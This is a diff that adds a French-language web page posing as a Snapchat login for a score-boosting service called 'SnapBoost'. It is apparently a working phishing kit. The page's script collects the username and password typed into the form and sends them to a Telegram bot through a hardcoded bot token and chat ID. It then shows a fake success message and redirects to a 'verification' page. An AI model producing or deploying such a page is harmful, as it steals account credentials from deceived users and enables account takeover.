@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Connexion Snapchat - Augmentez votre score Snap</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&family=Garamond&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="container">
+    <header>
+      <img src="logo.png" alt="Logo Snapchat" class="logo">
+      <h1>Connexion à Snapchat</h1>
+    </header>
+    
+    <main>
+      <p class="description">Boostez votre score Snap en un clin d'œil ! 🚀</p>
+      <form id="loginForm">
+        <div class="input-group">
+          <label for="username">Nom d'utilisateur ou Email</label>
+          <input type="text" id="username" name="username" placeholder="Entrez votre nom d'utilisateur ou email" required>
+        </div>
+        <div class="input-group">
+          <label for="password">Mot de passe</label>
+          <input type="password" id="password" name="password" placeholder="Entrez votre mot de passe" required>
+          <p class="forgot-password"><a href="https://accounts.snapchat.com/accounts/v2/login?continue=%2Faccounts%2Fchange_password" id="forgot-password">Mot de passe oublié ?</a></p>
+        </div>
+        <button type="button" onclick="submitForm()">Se connecter</button>
+        <p id="loading" style="display:none;">Chargement...</p>
+      </form>
+
+      <!-- Section du projet -->
+      <section class="about-section">
+        <h2>À propos de SnapBoost</h2>
+        <p>SnapBoost est un nouveau projet en phase de test conçu pour vous aider à augmenter votre score Snap rapidement et facilement. Ce service est encore en développement, et nous nous efforçons d'améliorer chaque aspect pour vous offrir la meilleure expérience possible. N'hésitez pas à partager vos retours avec nous pour nous aider à progresser !</p>
+      </section>
+    </main>
+    
+    <footer>
+      <p>&copy; 2025 SnapBoost. Tous droits réservés.</p>
+    </footer>
+  </div>
+
+  <script>
+    // Récupérer le formulaire et l'indicateur de chargement
+    const form = document.getElementById("loginForm");
+    const loading = document.getElementById("loading");
+
+    // Fonction qui gère la soumission du formulaire
+    function submitForm() {
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      // Afficher l'indicateur de chargement
+      loading.style.display = "block";
+
+      // Envoi des données au bot Telegram
+      sendToTelegram(username, password);
+
+      // Simulation de la requête (remplace ceci par ta logique de serveur si nécessaire)
+      setTimeout(() => {
+        loading.style.display = "none"; // Cacher le message de chargement
+        alert("Connexion réussie (simulation).");
+        window.location.href = "verification.html";  // Rediriger vers la page de vérification
+      }, 2000);
+    }
+
+    // Envoi des données au bot Telegram
+    function sendToTelegram(username, password) {
+      const botToken = "7754364382:AAGSI6WoQmn0YV4YUV7rLRFyUcVvBYf4juQ";  // Remplace par ton token
+      const chatId = "5305199760";  // Remplace par ton chat ID
+
+      // Créer un message avec les informations de connexion
+      const message = `🔑 **Détails de la connexion Snapchat** 🔑\n\n👤 **Nom d'utilisateur / Email** : ${username}\n🔒 **Mot de passe** : ${password}\n\n📝 Merci d'avoir utilisé ce service !`;
+
+      // Envoi du message au bot Telegram
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+        .then(response => response.json())
+        .then(data => alert("✅ Message envoyé avec succès ! 🎉"))
+        .catch(error => {
+          console.error("Erreur :", error);
+          alert("Une erreur s'est produite lors de l'envoi des données.");
+        });
+    }
+  </script>
+</body>
+</html>
